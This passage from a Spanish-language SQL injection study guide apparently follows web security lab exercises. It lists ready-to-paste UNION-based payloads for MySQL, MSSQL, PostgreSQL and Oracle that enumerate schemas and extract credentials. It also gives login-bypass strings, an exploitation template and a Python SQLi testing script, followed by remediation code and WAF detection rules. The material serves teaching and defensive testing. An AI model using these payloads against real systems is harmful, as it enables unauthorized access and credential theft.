'+UNION+SELECT+SYSTEM_USER,+NULL--
'+UNION+SELECT+@@SERVERNAME,+NULL--
```

---

**LÍNEA 580: ENUMERACIÓN COMPLETA EN MYSQL**

Si llegaste aquí desde el flowchart, confirmaste que es MySQL.

```sql
-- PASO 1: Confirmar MySQL
'+UNION+SELECT+@@version,+NULL#

-- PASO 2: Obtener base de datos actual
'+UNION+SELECT+DATABASE(),+NULL#

-- PASO 3: Listar todas las tablas
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables#

-- PASO 4: Filtrar tablas de la BD actual
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_schema=DATABASE()#

-- PASO 5: Identificar tabla objetivo (ej: users_abcdef)

-- PASO 6: Listar columnas de la tabla
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'#

-- PASO 7: Extraer datos
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef#
```

---

**LÍNEA 640: ENUMERACIÓN COMPLETA EN MSSQL**

Si llegaste aquí desde el flowchart, confirmaste que es Microsoft SQL Server.

```sql
-- PASO 1: Confirmar MSSQL
'+UNION+SELECT+@@version,+NULL--

-- PASO 2: Obtener base de datos actual
'+UNION+SELECT+DB_NAME(),+NULL--

-- PASO 3: Listar todas las tablas
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

-- PASO 4: Filtrar por esquema
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_schema='dbo'--

-- PASO 5: Listar columnas de tabla objetivo
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--

-- PASO 6: Extraer datos
'+UNION+SELECT+username,+password+FROM+users--
```

---

### LAB 8: Listar Contenido de BD en Non-Oracle

**Objetivo:**  
Enumerar completamente la estructura de la base de datos (tablas, columnas) y extraer credenciales para autenticarse como `administrator`.

**Escenario:**  
- No sabemos qué tablas existen
- No sabemos cómo se llaman las columnas
- Necesitamos descubrirlo usando `information_schema`

---

**EXPLICACIÓN TÉCNICA:**

`information_schema` es un esquema estándar SQL que contiene metadata sobre la base de datos:

```
information_schema
├── tables          → table_name, table_schema
├── columns         → column_name, table_name, data_type
└── schemata        → schema_name
```

**Flujo de enumeración:**
1. Listar todas las tablas
2. Identificar tabla de usuarios
3. Listar columnas de esa tabla
4. Extraer datos

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Verificar número de columnas y tipo

```
Payload:
'+UNION+SELECT+'abc','def'--
```

Confirmamos 2 columnas string.

**PASO 2:** Listar todas las tablas de la base de datos

```
Payload:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**Respuesta (fragmento):**
```html
<div class="product">
  <h3>products</h3>
</div>
<div class="product">
  <h3>users_abcdef</h3>
</div>
<div class="product">
  <h3>orders</h3>
</div>
<div class="product">
  <h3>admin_sessions</h3>
</div>
```

**PASO 3:** Identificar tabla objetivo

Tabla sospechosa: `users_abcdef`

**PASO 4:** Listar columnas de la tabla users_abcdef

```
Payload:
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

**Respuesta:**
```html
<div class="product">
  <h3>id</h3>
</div>
<div class="product">
  <h3>username_abcdef</h3>
</div>
<div class="product">
  <h3>password_abcdef</h3>
</div>
<div class="product">
  <h3>email</h3>
</div>
```

**PASO 5:** Extraer datos de la tabla

```
Payload:
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

**Respuesta:**
```html
<div class="product">
  <h3>administrator</h3>
  <p>s3cr3tP@ssw0rd</p>
</div>
<div class="product">
  <h3>carlos</h3>
  <p>secret456</p>
</div>
```

**PASO 6:** Login como administrator

```
Username: administrator
Password: s3cr3tP@ssw0rd
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Listar todas las tablas
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

-- Listar tablas del esquema actual
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_schema=DATABASE()--

-- Listar tablas excluyendo system tables
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_schema!='information_schema'--

-- Listar columnas de una tabla específica
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

-- Listar columnas con su tipo de dato
'+UNION+SELECT+column_name,+data_type+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

-- Concatenar tabla y columna
'+UNION+SELECT+CONCAT(table_name,'.',column_name),+NULL+FROM+information_schema.columns--

-- Extraer datos de tabla identificada
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

-- Filtrar por usuario específico
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef+WHERE+username_abcdef='administrator'--
```

---

**TÉCNICA AVANZADA: Exfiltrar TODAS las tablas y columnas en una consulta**

```sql
-- Concatenar tabla + columna para ver estructura completa
'+UNION+SELECT+CONCAT(table_name,':',column_name),+NULL+FROM+information_schema.columns--
```

**Respuesta:**
```
products:id
products:name
products:price
users_abcdef:id
users_abcdef:username_abcdef
users_abcdef:password_abcdef
```

Esto te da un mapa completo de la base de datos.

---

**LÍNEA 700: ENUMERACIÓN COMPLETA EN POSTGRESQL**

Si llegaste aquí desde el flowchart, confirmaste que es PostgreSQL.

```sql
-- PASO 1: Confirmar PostgreSQL
'+UNION+SELECT+version(),+NULL--

-- PASO 2: Obtener base de datos actual
'+UNION+SELECT+current_database(),+NULL--

-- PASO 3: Listar tablas del esquema public
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+WHERE+table_schema='public'--

-- PASO 4: Listar columnas de tabla objetivo
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--

-- PASO 5: Extraer datos
'+UNION+SELECT+username,+password+FROM+users--
```

---

### LAB 9: Listar Contenido de BD en Oracle

**Objetivo:**  
Enumerar estructura completa de Oracle Database y extraer credenciales.

**Diferencias con Non-Oracle:**
- Usar `all_tables` en lugar de `information_schema.tables`
- Usar `all_tab_columns` en lugar de `information_schema.columns`
- Nombres de tablas en MAYÚSCULAS
- Requiere `FROM dual` en consultas simples

---

**EXPLICACIÓN TÉCNICA:**

Oracle usa vistas del sistema propias:

```
all_tables
├── TABLE_NAME
├── OWNER
└── TABLESPACE_NAME

all_tab_columns
├── COLUMN_NAME
├── TABLE_NAME
└── DATA_TYPE
```

**CRÍTICO:** Los nombres de tablas en Oracle se almacenan en MAYÚSCULAS.

```sql
-- INCORRECTO
WHERE table_name='users'

-- CORRECTO
WHERE table_name='USERS'
```

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Confirmar Oracle y número de columnas

```
Payload:
'+UNION+SELECT+'abc','def'+FROM+dual--
```

2 columnas string confirmadas.

**PASO 2:** Listar todas las tablas

```
Payload:
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Respuesta (fragmento):**
```html
<div class="product">
  <h3>PRODUCTS</h3>
</div>
<div class="product">
  <h3>USERS_ABCDEF</h3>
</div>
<div class="product">
  <h3>ORDERS</h3>
</div>
```

**PASO 3:** Identificar tabla objetivo

Tabla: `USERS_ABCDEF` (en MAYÚSCULAS)

**PASO 4:** Listar columnas de USERS_ABCDEF

```
Payload:
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

**MUY IMPORTANTE:** `table_name='USERS_ABCDEF'` debe estar en MAYÚSCULAS.

**Respuesta:**
```html
<div class="product">
  <h3>USER_ID</h3>
</div>
<div class="product">
  <h3>USERNAME_ABCDEF</h3>
</div>
<div class="product">
  <h3>PASSWORD_ABCDEF</h3>
</div>
<div class="product">
  <h3>EMAIL</h3>
</div>
```

**PASO 5:** Extraer datos

```
Payload:
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

**Respuesta:**
```html
<div class="product">
  <h3>ADMINISTRATOR</h3>
  <p>s3cr3tP@ssw0rd</p>
</div>
```

**PASO 6:** Login

```
Username: administrator (minúsculas en el login)
Password: s3cr3tP@ssw0rd
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Confirmar Oracle
'+UNION+SELECT+NULL,NULL+FROM+dual--

-- Obtener versión
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

-- Listar todas las tablas
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

-- Filtrar tablas del usuario actual
'+UNION+SELECT+table_name,NULL+FROM+user_tables--

-- Listar columnas de tabla específica (MAYÚSCULAS obligatorio)
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

-- Listar columnas con tipo de dato
'+UNION+SELECT+column_name,data_type+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

-- Extraer datos de tabla
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

-- Concatenar múltiples columnas en Oracle
'+UNION+SELECT+USERNAME_ABCDEF||':'||PASSWORD_ABCDEF,+NULL+FROM+USERS_ABCDEF--

-- Filtrar por usuario específico
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF+WHERE+USERNAME_ABCDEF='ADMINISTRATOR'--
```

---

**TABLA COMPARATIVA: Oracle vs Non-Oracle**

| Operación | Non-Oracle | Oracle |
|-----------|-----------|--------|
| **Listar tablas** | `FROM information_schema.tables` | `FROM all_tables` |
| **Listar columnas** | `FROM information_schema.columns` | `FROM all_tab_columns` |
| **Filtrar tabla** | `WHERE table_name='users'` | `WHERE table_name='USERS'` |
| **Tabla dummy** | No requerida | `FROM dual` |
| **Concatenación** | `CONCAT()` | `\|\|` |
| **Comentario** | `--` o `#` | `--` |
| **Case sensitivity** | Minúsculas | MAYÚSCULAS |

---

## 7. COMANDOS BASE DE EXPLOTACIÓN

### 7.1 Payloads de Detección de Vulnerabilidad

**Copiar y pegar directamente:**

```sql
-- Test básico de comilla simple
'

-- Test de tautología
' OR '1'='1

-- Test de comentario MySQL
' OR '1'='1'#

-- Test de comentario genérico
' OR '1'='1'--

-- Test de UNION básico
' UNION SELECT NULL--

-- Test de error provocado
' AND 1=CONVERT(int,'abc')--
```

---

### 7.2 Payloads de Identificación de DBMS

**MySQL:**
```sql
'+UNION+SELECT+@@version,+NULL#
'+UNION+SELECT+VERSION(),+NULL#
'+UNION+SELECT+DATABASE(),+NULL#
'+UNION+SELECT+USER(),+NULL#
```

**Oracle:**
```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
'+UNION+SELECT+NULL,NULL+FROM+dual--
'+UNION+SELECT+user,+NULL+FROM+dual--
```

**Microsoft SQL Server:**
```sql
'+UNION+SELECT+@@version,+NULL--
'+UNION+SELECT+DB_NAME(),+NULL--
'+UNION+SELECT+SYSTEM_USER,+NULL--
```

**PostgreSQL:**
```sql
'+UNION+SELECT+version(),+NULL--
'+UNION+SELECT+current_database(),+NULL--
'+UNION+SELECT+current_user,+NULL--
```

---

### 7.3 Payloads de Enumeración

**Determinar número de columnas:**
```sql
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL--
```

**Identificar columnas string:**
```sql
'+UNION+SELECT+'abc',NULL,NULL--
'+UNION+SELECT+NULL,'abc',NULL--
'+UNION+SELECT+NULL,NULL,'abc'--
```

**Listar tablas (Non-Oracle):**
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables--
```

**Listar tablas (Oracle):**
```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+table_name,NULL+FROM+user_tables--
```

**Listar columnas (Non-Oracle):**
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
'+UNION+SELECT+column_name,+data_type+FROM+information_schema.columns+WHERE+table_name='users'--
```

**Listar columnas (Oracle):**
```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--
'+UNION+SELECT+column_name,data_type+FROM+all_tab_columns+WHERE+table_name='USERS'--
```

---

### 7.4 Payloads de Extracción de Datos

**Extraer usuarios y contraseñas:**
```sql
-- Non-Oracle
'+UNION+SELECT+username,+password+FROM+users--

-- Oracle
'+UNION+SELECT+USERNAME,+PASSWORD+FROM+USERS--
```

**Extraer con filtro:**
```sql
'+UNION+SELECT+username,+password+FROM+users+WHERE+username='administrator'--
'+UNION+SELECT+username,+password+FROM+users+WHERE+id=1--
```

**Concatenar múltiples columnas:**
```sql
-- MySQL
'+UNION+SELECT+CONCAT(username,':',password),+NULL+FROM+users--

-- Oracle
'+UNION+SELECT+username||':'||password,+NULL+FROM+users--

-- PostgreSQL
'+UNION+SELECT+username||':'||password,+NULL+FROM+users--

-- MSSQL
'+UNION+SELECT+username+'+'+password,+NULL+FROM+users--
```

**Extraer con LIMIT (MySQL/PostgreSQL):**
```sql
'+UNION+SELECT+username,+password+FROM+users+LIMIT+1--
'+UNION+SELECT+username,+password+FROM+users+LIMIT+1+OFFSET+1--
```

**Extraer con ROWNUM (Oracle):**
```sql
'+UNION+SELECT+username,+password+FROM+users+WHERE+ROWNUM=1--
```

**Extraer con TOP (MSSQL):**
```sql
'+UNION+SELECT+TOP+1+username,+password+FROM+users--
```

---

### 7.5 Payloads de Bypass de Autenticación

**Login bypass básico:**
```sql
admin'--
administrator'--
root'--
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
admin' OR 1=1#
```

**Login bypass avanzado:**
```sql
admin'/*
admin' OR '1'='1'/*
' OR 'x'='x
') OR ('1'='1
admin') OR ('1'='1'--
```

---

### 7.6 Template de Explotación Completa

**Copia este template y personaliza según tu objetivo:**

```sql
-- FASE 1: DETECCIÓN
'
' OR '1'='1

-- FASE 2: IDENTIFICACIÓN DBMS
-- Probar cada uno hasta encontrar cuál funciona
'+UNION+SELECT+NULL+FROM+dual--              # Oracle
'+UNION+SELECT+@@version,+NULL#              # MySQL
'+UNION+SELECT+@@version,+NULL--             # MSSQL
'+UNION+SELECT+version(),+NULL--             # PostgreSQL

-- FASE 3: NÚMERO DE COLUMNAS
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
# Continuar hasta que NO haya error

-- FASE 4: COLUMNAS STRING
'+UNION+SELECT+'abc',NULL,NULL--
'+UNION+SELECT+NULL,'abc',NULL--
'+UNION+SELECT+NULL,NULL,'abc'--
# Identificar cuál NO da error

-- FASE 5A: ENUMERAR TABLAS (Non-Oracle)
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

-- FASE 5B: ENUMERAR TABLAS (Oracle)
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

-- FASE 6A: ENUMERAR COLUMNAS (Non-Oracle)
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='TABLA_OBJETIVO'--

-- FASE 6B: ENUMERAR COLUMNAS (Oracle)
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='TABLA_OBJETIVO'--

-- FASE 7: EXTRAER DATOS
'+UNION+SELECT+columna1,+columna2+FROM+TABLA_OBJETIVO--
```

---

## 8. PERSPECTIVA QA

### 8.1 Checklist de Testing

**Fase de Descubrimiento:**

- [ ] Identificar todos los parámetros de entrada (GET, POST, cookies, headers)
- [ ] Mapear endpoints que interactúan con base de datos
- [ ] Documentar parámetros con validación débil
- [ ] Probar caracteres especiales: `' " ; -- # /* */`

**Fase de Confirmación:**

- [ ] Inyectar `'` y verificar errores SQL
- [ ] Inyectar `' OR '1'='1` y observar cambios de comportamiento
- [ ] Probar bypass de autenticación con `admin'--`
- [ ] Confirmar vulnerabilidad con UNION básico

**Fase de Enumeración:**

- [ ] Determinar número de columnas
- [ ] Identificar columnas de tipo string
- [ ] Identificar DBMS (Oracle, MySQL, MSSQL, PostgreSQL)
- [ ] Listar tablas de la base de datos
- [ ] Listar columnas de tablas sensibles
- [ ] Extraer datos de prueba (NO datos reales si es producción)

**Fase de Documentación:**

- [ ] Screenshot de requests y responses
- [ ] Captura de Burp Suite
- [ ] Listar todos los endpoints vulnerables
- [ ] Documentar severidad según impacto
- [ ] Proponer remediación específica

---

### 8.2 Niveles de Severidad

**CRÍTICA:**
- Bypass de autenticación
- Extracción de credenciales
- Acceso a datos de tarjetas de crédito
- Modificación/eliminación de datos

**ALTA:**
- Lectura de datos sensibles (PII, emails, teléfonos)
- Enumeración completa de estructura de BD
- Listado de usuarios del sistema

**MEDIA:**
- Extracción de datos públicos con filtros bypasseados
- Información técnica del sistema (versiones, paths)

**BAJA:**
- Error messages que revelan tecnologías
- SQLi sin datos sensibles accesibles

---

### 8.3 Template de Reporte

```markdown
# REPORTE DE VULNERABILIDAD: SQL INJECTION

## INFORMACIÓN GENERAL
**ID Vulnerabilidad:** VULN-2025-001
**Fecha de Detección:** 2025-11-20
**Tester:** [Tu Nombre]
**Aplicación:** [Nombre de la aplicación]
**Versión:** [Versión]
**Entorno:** [Desarrollo/Staging/Producción]

## CLASIFICACIÓN
**Severidad:** CRÍTICA
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in SQL Command)
**OWASP Top 10:** A03:2021 - Injection
**CVSS v3.1 Score:** 9.8 (Critical)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## DESCRIPCIÓN TÉCNICA
La aplicación es vulnerable a SQL Injection en el parámetro `category` del endpoint `/filter`.
La consulta SQL se construye mediante concatenación de strings sin validación ni sanitización de entrada.

**Consulta vulnerable (código fuente si disponible):**
```python
query = "SELECT * FROM products WHERE category = '" + user_input + "'"
cursor.execute(query)
```

**Tipo de SQLi:** In-Band UNION-based
**DBMS identificado:** MySQL 5.7.33

## EVIDENCIA DE EXPLOTACIÓN

### Request HTTP Vulnerable
```http
GET /filter?category='+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
```

### Response HTTP
```http
HTTP/1.1 200 OK
Content-Type: text/html

<div class="product">
  <h3>administrator</h3>
  <p>s3cr3tP@ssw0rd123</p>
</div>
<div class="product">
  <h3>carlos</h3>
  <p>montoya456</p>
</div>
```

### Screenshots
- `screenshot_1_error_sql.png` - Error SQL provocado
- `screenshot_2_union_attack.png` - UNION attack exitoso
- `screenshot_3_data_exfiltration.png` - Credenciales extraídas

### Burp Suite Evidence
```
Ver archivo adjunto: burp_request_response.xml
```

## IMPACTO EN EL NEGOCIO

**Confidencialidad:** ALTA
- Acceso no autorizado a 1,247 registros de usuarios
- Extracción de credenciales en texto plano
- Exposición de datos personales (emails, teléfonos)

**Integridad:** ALTA (No probado para evitar daños)
- Potencial para modificar datos con UPDATE
- Potencial para eliminar registros con DELETE
- Posible escalada a ejecución de comandos OS (xp_cmdshell en MSSQL)

**Disponibilidad:** MEDIA
- Posibilidad de DoS mediante consultas costosas
- Potencial DROP de tablas

**Impacto Legal/Regulatorio:**
- Violación de GDPR (Art. 32 - Seguridad del tratamiento)
- Incumplimiento de PCI-DSS (Req. 6.5.1)
- Exposición a multas y pérdida de confianza

**Impacto Reputacional:**
- Pérdida de confianza del cliente
- Daño a imagen de marca
- Posible publicación en medios si se explota

## PASOS PARA REPRODUCIR

1. Abrir Burp Suite y configurar proxy
2. Navegar a `http://vulnerable-app.com/filter?category=Gifts`
3. Interceptar request en Burp
4. Modificar parámetro category:
   ```
   category='+UNION+SELECT+username,password+FROM+users--
   ```
5. Forward request
6. Observar en response la lista de usuarios y contraseñas
7. Utilizar credenciales para login exitoso

**Tiempo de reproducción:** < 5 minutos
**Requisitos:** Burp Suite (free edition suficiente)
**Nivel de skill requerido:** Básico

## RECOMENDACIONES DE REMEDIACIÓN

### INMEDIATAS (Prioridad CRÍTICA - Implementar en 24-48h)

**1. Implementar Prepared Statements**

```python
# ANTES (VULNERABLE)
query = "SELECT * FROM products WHERE category = '" + category + "'"
cursor.execute(query)

# DESPUÉS (SEGURO)
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (category,))
```

**2. Implementar Validación de Entrada con Whitelist**

```python
ALLOWED_CATEGORIES = ['Gifts', 'Electronics', 'Books', 'Clothing']

if category not in ALLOWED_CATEGORIES:
    return error_response("Invalid category", 400)
```

**3. Desactivar Mensajes de Error SQL Detallados en Producción**

```python
# Configuración de producción
DEBUG = False
SHOW_SQL_ERRORS = False
```

### A CORTO PLAZO (1-2 semanas)

**4. Code Review de Toda la Aplicación**

Auditar todos los endpoints que construyen queries SQL:
- Controllers de búsqueda
- Filtros de productos
- Login/autenticación
- APIs internas

**5. Implementar WAF (Web Application Firewall)**

Configurar ModSecurity con OWASP Core Rule Set:
```apache
SecRule ARGS "@rx (?i)(union|select|insert)" \
    "id:1001,phase:2,block,msg:'SQL Injection Attempt'"
```

**6. Principio de Mínimos Privilegios en Usuario de BD**

```sql
-- Usuario actual (INCORRECTO)
GRANT ALL PRIVILEGES ON database.* TO 'webapp'@'localhost';

-- Usuario corregido (CORRECTO)
GRANT SELECT, INSERT, UPDATE ON database.products TO 'webapp'@'localhost';
GRANT SELECT ON database.users TO 'webapp'@'localhost';
REVOKE DROP, CREATE, ALTER ON database.* FROM 'webapp'@'localhost';
```

### A MEDIO PLAZO (1 mes)

**7. Implementar ORM (Object-Relational Mapping)**

Migrar de raw SQL a ORM seguro:
```python
# Con SQLAlchemy (ejemplo)
user = session.query(User).filter(User.username == username).first()
```

**8. Implementar Logging y Monitoreo**

```python
# Log de intentos de SQLi
if detect_sql_injection(user_input):
    logger.warning(f"SQL Injection attempt from IP {request.remote_addr}: {user_input}")
    block_ip(request.remote_addr)
```

**9. Penetration Testing Regular**

- Contratar pentesting externo cada 6 meses
- Implementar DAST en CI/CD pipeline

### A LARGO PLAZO

**10. Training del Equipo de Desarrollo**

- Curso de Secure Coding (OWASP)
- Certificación en seguridad web
- Code review con checklist de seguridad

**11. Implementar SDLC Seguro**

- Security requirements en fase de diseño
- Threat modeling
- Security testing automatizado
- Bug bounty program

## REFERENCIAS

**OWASP:**
- SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- ASVS V5: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md

**CWE:**
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

**NIST:**
- SP 800-53 Rev. 5 - SI-10: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final

**Exploits Públicos:**
- SQLMap: https://sqlmap.org/
- Metasploit SQLi Modules: https://www.rapid7.com/db/?q=sql+injection

## HISTORIAL DE CAMBIOS

| Fecha | Versión | Cambios |
|-------|---------|---------|
| 2025-11-20 | 1.0 | Detección inicial y reporte |
| 2025-11-21 | 1.1 | Añadida evidencia adicional |

## APROBACIONES

**Tester:** [Tu firma digital]  
**Lead QA:** [Pendiente]  
**CISO:** [Pendiente]  
**CTO:** [Pendiente]
```

---

### 8.4 Script de Automatización para QA

```python
#!/usr/bin/env python3
"""
SQL Injection Testing Automation Script
Para uso en entornos de QA/Testing autorizados
"""

import requests
import sys
from urllib.parse import urljoin

class SQLiTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_basic_injection(self, param_name, endpoint):
        """Test básico de detección de SQLi"""
        print(f"[*] Testing {endpoint} parameter: {param_name}")
        
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--"
        ]
        
        for payload in payloads:
            url = urljoin(self.base_url, endpoint)
            params = {param_name: payload}
            
            try:
                response = self.session.get(url, params=params)
                
                # Detectar errores SQL
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PostgreSQL",
                    "Microsoft SQL",
                    "ODBC"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        print(f"[+] VULNERABLE: {payload}")
                        print(f"    Error: {error}")
                        return True
                        
                # Detectar cambios en longitud de respuesta
                if len(response.text) != self.baseline_length:
                    print(f"[+] Possible SQLi: {payload}")
                    print(f"    Response length changed")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
                
        return False
    
    def determine_columns(self, param_name, endpoint):
        """Determinar número de columnas"""
        print("[*] Determining number of columns...")
        
        for i in range(1, 20):
            nulls = ',NULL' * i
            payload = f"' UNION SELECT{nulls}--"
            
            url = urljoin(self.base_url, endpoint)
            params = {param_name: payload}
            
            try:
                response = self.session.get(url, params=params)
                
                if "error" not in response.text.lower():
                    print(f"[+] Number of columns: {i}")
                    return i
                    
            except Exception as e:
                continue
                
        print("[-] Could not determine number of columns")
        return None

# Uso
if __name__ == "__main__":
    tester = SQLiTester("http://target-app.com")
    tester.test_basic_injection("category", "/filter")
```

---

## 9. CONTRAMEDIDAS

### 9.1 Prepared Statements (Defensa Principal)

**Python (psycopg2 - PostgreSQL):**
```python
import psycopg2

# VULNERABLE
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# SEGURO
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Python (mysql.connector):**
```python
import mysql.connector

# VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# SEGURO
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**Python (sqlite3):**
```python
import sqlite3

# VULNERABLE
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# SEGURO
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**PHP (PDO):**
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);

// SEGURO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

**PHP (MySQLi):**
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);

// SEGURO
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

**Java (JDBC):**
```java
// VULNERABLE
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SEGURO
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

**Node.js (mysql2):**
```javascript
// VULNERABLE
connection.query('SELECT * FROM users WHERE id = ' + userId, callback);

// SEGURO
connection.query('SELECT * FROM users WHERE id = ?', [userId], callback);
```

**C# (ADO.NET):**
```csharp
// VULNERABLE
string query = "SELECT * FROM users WHERE username = '" + username + "'";
SqlCommand cmd = new SqlCommand(query, conn);

// SEGURO
string query = "SELECT * FROM users WHERE username = @username";
SqlCommand cmd = new SqlCommand(query, conn);
cmd.Parameters.AddWithValue("@username", username);
```

---

### 9.2 ORM (Object-Relational Mapping)

**Django (Python):**
```python
# VULNERABLE (raw SQL)
User.objects.raw("SELECT * FROM users WHERE username = '%s'" % username)

# SEGURO (ORM)
User.objects.filter(username=username)
```

**SQLAlchemy (Python):**
```python
# VULNERABLE
session.execute(f"SELECT * FROM users WHERE username = '{username}'")

# SEGURO
session.query(User).filter(User.username == username).first()
```

**Entity Framework (C#):**
```csharp
// VULNERABLE
context.Database.ExecuteSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'");

// SEGURO
var user = context.Users.Where(u => u.Username == username).FirstOrDefault();
```

**Hibernate (Java):**
```java
// VULNERABLE
session.createQuery("FROM User WHERE username = '" + username + "'");

// SEGURO
session.createQuery("FROM User WHERE username = :username")
       .setParameter("username", username);
```

**Sequelize (Node.js):**
```javascript
// VULNERABLE
sequelize.query(`SELECT * FROM users WHERE username = '${username}'`);

// SEGURO
User.findOne({ where: { username: username } });
```

---

### 9.3 Validación de Entrada

**Whitelist (Recomendado):**
```python
# Ejemplo: Filtro de categorías
ALLOWED_CATEGORIES = ['Gifts', 'Electronics', 'Books', 'Clothing', 'Sports']

def validate_category(category):
    if category not in ALLOWED_CATEGORIES:
        raise ValueError("Invalid category")
    return category

# Uso
category = validate_category(user_input)
```

**Validación con Regex:**
```python
import re

def validate_username(username):
    # Solo letras, números, guiones y underscores
    if not re.match(r'^[a-zA-Z0-9_-]+$', username):
        raise ValueError("Invalid username format")
    return username
```

**Validación de Tipos de Dato:**
```python
def validate_product_id(product_id):
    try:
        product_id = int(product_id)
        if product_id < 1:
            raise ValueError
        return product_id
    except (ValueError, TypeError):
        raise ValueError("Invalid product ID")
```

---

### 9.4 Escaping (Último Recurso)

**Solo si NO puedes usar prepared statements (legacy code):**

**MySQL:**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
```

**PostgreSQL:**
```php
$username = pg_escape_string($conn, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
```

**ADVERTENCIA:** Escaping es propenso a errores. Usar SOLO como medida temporal.

---

### 9.5 WAF (Web Application Firewall)

**ModSecurity - Reglas de Ejemplo:**

```apache
# Detectar UNION
SecRule ARGS "@rx (?i)union" \
    "id:1001,phase:2,block,msg:'SQL Injection - UNION detected'"

# Detectar comentarios SQL
SecRule ARGS "@rx (--|#|\/\*|\*\/)" \
